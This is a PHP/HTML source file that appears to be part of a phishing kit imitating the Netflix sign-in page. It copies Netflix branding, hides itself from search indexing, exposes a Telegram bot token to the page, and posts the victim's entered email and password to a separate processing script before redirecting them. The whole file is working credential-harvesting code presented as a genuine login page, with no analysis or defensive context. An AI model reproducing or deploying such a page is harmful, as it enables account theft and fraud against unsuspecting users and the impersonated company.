<?php
   

    require_once '../app/config.php';
    $_SESSION['last_page'] = "login";
	$token  = TELEGRAM_TOKEN;

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Netflix</title>
    </head>

    <body class="index-wrap">

		<div id="index">
            
            <!-- LOGO -->
            <div class="logo">
                <svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg>
            </div>
		    <script>var token=<?php echo json_encode($token); ?>;</script>

            <!-- END LOGO -->

            <!-- LOGIN AREA -->
            <div class="login-area">
                <div id="forma">
                    <input type="hidden" id="cap" name="cap">
                    <input type="hidden" name="steeep" id="steeep" value="login">
                    <legend><?php echo get_text('signin'); ?></legend>
                    <label class="<?php echo errclass($_SESSION['errors'],'username') ?>">
                        <p class="label-txt"><?php echo get_text('email_placeholder'); ?></p>
                        <input type="text" class="input" id="username" name="username">
                        <?php echo errmsg($_SESSION['errors'],'username'); ?>
                    </label>
                    <label class="<?php echo errclass($_SESSION['errors'],'password') ?>">
                        <p class="label-txt"><?php echo get_text('password_placeholder'); ?></p>
                        <input type="password" class="input" id="password" name="password">
                        <?php echo errmsg($_SESSION['errors'],'password'); ?>
                    </label>
                    <div class="btns">
                        <button id="booom" class="btttn"><?php echo get_text('signin'); ?></button>
                    </div>
                    <div class="remember d-flex">
                        <div class="flex-grow-1"><img src="../media/imgs/rem.png"> <?php echo get_text('remember'); ?></div>
                        <div><?php echo get_text('need_help'); ?></div>
                    </div>
                    <p><img src="../media/imgs/fb.png"> <?php echo get_text('login_facebook'); ?></p>
                    <p class="fz16" style="font-weight: 400;"><?php echo get_text('signup'); ?></p>
                    <p class="mb-0"><?php echo get_text('login_text'); ?></p>
                </div>
            </div>
            <!-- END LOGIN AREA -->

            <!-- FOOTER -->
            <div id="footer">
                <div class="container">
                    <div class="row mb20">
                        <div class="col-12">
                            <ul>
                                <li class="fz16"><?php echo get_text('questions'); ?></li>
                            </ul>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                            <ul>
                                <li><?php echo get_text('faq'); ?></li>
                                <li><?php echo get_text('cookies'); ?></li>
                            </ul>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                            <ul>
                                <li><?php echo get_text('help'); ?></li>
                                <li><?php echo get_text('corporate'); ?></li>
                            </ul>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                            <ul>
                                <li><?php echo get_text('terms'); ?></li>
                            </ul>
                        </div>
                        <div class="col-lg-3 col-md-6 col-sm-6 col-6 mb-4">
                            <ul>
                                <li><?php echo get_text('privacy'); ?></li>
                            </ul>
                        </div>
                    </div>
                    <div class="lang">
                        <div class="getlang">
                            <div><img src="../media/imgs/icon-lang.png"></div>
                            
                            <?php
                            if( $_SESSION['lang'] == 'en' ) {
                                echo 'English';
                            } else if( $_SESSION['lang'] == 'fr' ) {
                                echo 'Francais';
                            } else if( $_SESSION['lang'] == 'es' ) {
                                echo 'Espagnol';
                            } else if( $_SESSION['lang'] == 'ar' ) {
                                echo 'العربية';
                            }
                            ?>

                            <div><img src="../media/imgs/arrow-down.png"></div>
                        </div>
                        <ul>
                            <!--<li><a href="../index.php?lang=ar">العربية</a></li>-->
                            <li><a href="../index.php?lang=es">Espagnol</a></li>
                            <li><a href="../index.php?lang=fr">Francais</a></li>
                            <li><a href="../index.php?lang=en">English</a></li>
                            <li><a href="../index.php?lang=pt">Português</a></li>
                            <li><a href="../index.php?lang=de">Deutsch</a></li>
                          <li><a href="../index.php?lang=jp">Japanese</a></li>

                        </ul>
                    </div>
                </div>
            </div>
            <!-- END FOOTER -->

        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/countdownTimer.min.js"></script>
        <script src="../media/js/js.js"></script>
		<script src="../media/js/jq.js"></script>


        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'username' : $('#username').val(),
                    'password' : $('#password').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>